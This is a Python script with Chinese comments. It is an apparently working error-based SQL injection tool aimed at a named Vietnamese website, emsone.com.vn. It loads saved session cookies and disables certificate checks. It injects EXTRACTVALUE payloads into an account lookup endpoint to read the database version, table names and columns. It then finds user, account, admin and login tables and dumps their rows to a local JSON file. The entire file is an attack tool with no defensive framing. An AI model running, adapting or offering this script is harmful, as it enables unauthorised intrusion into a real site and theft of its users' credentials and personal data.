#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests
import urllib.parse
import json
import re
import urllib3
urllib3.disable_warnings()

class DatabaseExtractor:
    def __init__(self):
        self.base_url = "https://emsone.com.vn"
        self.session = requests.Session()
        self.session.verify = False
        self.load_session()
        self.db_info = {}
        
    def load_session(self):
        try:
            with open('session_cookies.json', 'r') as f:
                cookies = json.load(f)
                self.session.cookies.update(cookies)
        except:
            pass
    
    def extract_with_error(self, query, label):
        """使用报错注入提取数据"""
        print(f"\n[*] 提取: {label}")
        payload = f"1' AND EXTRACTVALUE(1, CONCAT(0x7e, ({query}), 0x7e))--"
        url = f"{self.base_url}/Account/GetUserInfo?id={urllib.parse.quote(payload)}"
        
        try:
            r = self.session.get(url, timeout=10)
            # 提取XPATH错误中的值
            match = re.search(r"XPATH syntax error: '~([^']+)~'", r.text, re.IGNORECASE)
            if match:
                value = match.group(1)
                print(f"    [+] {label}: {value}")
                return value
            else:
                # 尝试其他格式
                match = re.search(r"'~([^']+)~'", r.text)
                if match:
                    value = match.group(1)
                    print(f"    [+] {label}: {value}")
                    return value
        except Exception as e:
            print(f"    [-] Error: {e}")
        return None
    
    def extract_with_substring(self, query, label, max_len=100):
        """使用SUBSTRING分段提取"""
        print(f"\n[*] 分段提取: {label}")
        result = ""
        
        for i in range(1, max_len, 30):
            substring_query = f"SUBSTRING(({query}), {i}, 30)"
            payload = f"1' AND EXTRACTVALUE(1, CONCAT(0x7e, ({substring_query}), 0x7e))--"
            url = f"{self.base_url}/Account/GetUserInfo?id={urllib.parse.quote(payload)}"
            
            try:
                r = self.session.get(url, timeout=10)
                match = re.search(r"XPATH syntax error: '~([^']+)~'", r.text, re.IGNORECASE)
                if match:
                    chunk = match.group(1)
                    if chunk:
                        result += chunk
                        print(f"    [+] 片段 {i}: {chunk}")
                    else:
                        break
                else:
                    break
            except:
                break
        
        if result:
            print(f"    [+] 完整结果: {result[:200]}")
            return result
        return None
    
    def extract_database_info(self):
        """提取数据库基础信息"""
        print("[*] 提取数据库基础信息")
        
        self.db_info['version'] = self.extract_with_error("SELECT version()", "数据库版本")
        self.db_info['database'] = self.extract_with_error("SELECT database()", "数据库名")
        self.db_info['user'] = self.extract_with_error("SELECT user()", "当前用户")
        self.db_info['@@version'] = self.extract_with_error("SELECT @@version", "MySQL版本")
    
    def extract_tables(self):
        """提取所有表名"""
        print("\n[*] 提取表名列表")
        
        # 先尝试直接提取
        tables = self.extract_with_error(
            "SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()",
            "所有表名"
        )
        
        if not tables or len(tables) < 10:
            # 分段提取
            tables = self.extract_with_substring(
                "SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()",
                "表名列表",
                max_len=500
            )
        
        if tables:
            self.db_info['tables'] = tables.split(',') if ',' in tables else [tables]
            print(f"    [+] 发现 {len(self.db_info['tables'])} 个表")
            return self.db_info['tables']
        
        return []
    
    def extract_table_columns(self, table_name):
        """提取表的列名"""
        print(f"\n[*] 提取表列名: {table_name}")
        
        columns = self.extract_with_substring(
            f"SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='{table_name}' AND table_schema=database()",
            f"{table_name}列名",
            max_len=200
        )
        
        if columns:
            col_list = columns.split(',')
            print(f"    [+] 发现 {len(col_list)} 列")
            return col_list
        return []
    
    def extract_table_data(self, table_name, columns, limit=10):
        """提取表数据"""
        print(f"\n[*] 提取表数据: {table_name} (前{limit}条)")
        
        if not columns:
            return None
        
        # 构建CONCAT查询
        col_list = ','.join([f"`{col}`" for col in columns[:5]])  # 限制列数
        concat_query = f"CONCAT({col_list})"
        
        # 提取数据
        data = self.extract_with_substring(
            f"SELECT GROUP_CONCAT({concat_query} SEPARATOR '|||') FROM {table_name} LIMIT 0,{limit}",
            f"{table_name}数据",
            max_len=1000
        )
        
        if data:
            records = data.split('|||')
            print(f"    [+] 提取 {len(records)} 条记录")
            return records
        return None
    
    def find_user_tables(self):
        """查找用户相关表"""
        tables = self.db_info.get('tables', [])
        user_tables = []
        
        keywords = ['user', 'account', 'admin', 'customer', 'member', 'login', 'auth']
        for table in tables:
            table_lower = table.lower()
            if any(kw in table_lower for kw in keywords):
                user_tables.append(table)
        
        return user_tables
    
    def extract_all_user_data(self):
        """提取所有用户数据"""
        print("\n[*] 提取用户数据")
        
        user_tables = self.find_user_tables()
        if not user_tables:
            print("    [-] 未找到用户相关表")
            return
        
        print(f"    [+] 发现用户表: {user_tables}")
        
        for table in user_tables[:5]:  # 限制前5个表
            columns = self.extract_table_columns(table)
            if columns:
                self.db_info[f'{table}_columns'] = columns
                data = self.extract_table_data(table, columns, limit=20)
                if data:
                    self.db_info[f'{table}_data'] = data
    
    def save_results(self):
        """保存结果"""
        with open('database_extracted.json', 'w', encoding='utf-8') as f:
            json.dump(self.db_info, f, indent=2, ensure_ascii=False)
        
        print(f"\n[+] 数据库信息已保存到 database_extracted.json")
        print(f"[+] 提取的表数: {len(self.db_info.get('tables', []))}")
        print(f"[+] 提取的用户表数据: {len([k for k in self.db_info.keys() if '_data' in k])}")
    
    def run_all(self):
        """执行所有提取"""
        print("="*60)
        print("数据库提取")
        print("="*60)
        
        self.extract_database_info()
        self.extract_tables()
        self.extract_all_user_data()
        self.save_results()
        
        print("\n" + "="*60)
        print("提取完成")
        print("="*60)

if __name__ == "__main__":
    extractor = DatabaseExtractor()
    extractor.run_all()